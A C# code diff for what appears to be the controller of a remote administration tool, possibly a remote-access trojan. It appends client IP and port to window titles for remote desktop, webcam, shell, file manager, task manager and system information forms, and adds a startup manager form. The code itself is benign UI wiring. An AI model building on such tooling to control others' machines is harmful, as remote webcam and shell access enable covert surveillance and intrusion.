@@ -44,7 +44,7 @@ namespace Serveur.Controllers
             try
             {
                 FrmRemoteDesktop frmRdp = new FrmRemoteDesktop(client);
-                frmRdp.Text = "Remote Desktop";
+                frmRdp.Text = "Remote Desktop" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                 frmRdp.ShowDialog();
             }
             catch (Exception ex)
@@ -58,7 +58,7 @@ namespace Serveur.Controllers
             try
             {
                 FrmRemoteWebcam frmwbc = new FrmRemoteWebcam(client);
-                frmwbc.Text = "Remote Webcam";
+                frmwbc.Text = "Remote Webcam" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                 frmwbc.ShowDialog();
             }
             catch (Exception ex)
@@ -72,7 +72,7 @@ namespace Serveur.Controllers
             try
             {
                 FrmRemoteShell frmRemoteShell = new FrmRemoteShell(client);
-                frmRemoteShell.Text = "Remote Shell";
+                frmRemoteShell.Text = "Remote Shell" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                 frmRemoteShell.ShowDialog();
             }
             catch (Exception ex)
@@ -86,7 +86,7 @@ namespace Serveur.Controllers
             try
             {
                 FrmFileManager frmFm = new FrmFileManager(client);
-                frmFm.Text = "File Manager";
+                frmFm.Text = "File Manager" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                 frmFm.ShowDialog();
             }
             catch (Exception ex)
@@ -100,7 +100,7 @@ namespace Serveur.Controllers
             try
             {
                 FrmTaskManager frmTm = new FrmTaskManager(client);
-                frmTm.Text = "Task Manager";
+                frmTm.Text = "Task Manager" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                 frmTm.ShowDialog();
             }
             catch (Exception ex)
@@ -114,8 +114,22 @@ namespace Serveur.Controllers
             try
             {
                 FrmSystemInformation frmSi = new FrmSystemInformation(client);
-                frmSi.Text = "System Information";
+                frmSi.Text = "System Information" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
                 frmSi.ShowDialog();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "FrmSi MainController", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+
+        public void frmStm(ClientMosaic client)
+        {
+            try
+            {
+                FrmStartupManager frmStm = new FrmStartupManager(client);
+                frmStm.Text = "Startup Manager" + ' ' + client.endPoint.Address + " : " + client.endPoint.Port;
+                frmStm.ShowDialog();
             }
             catch (Exception ex)
             {
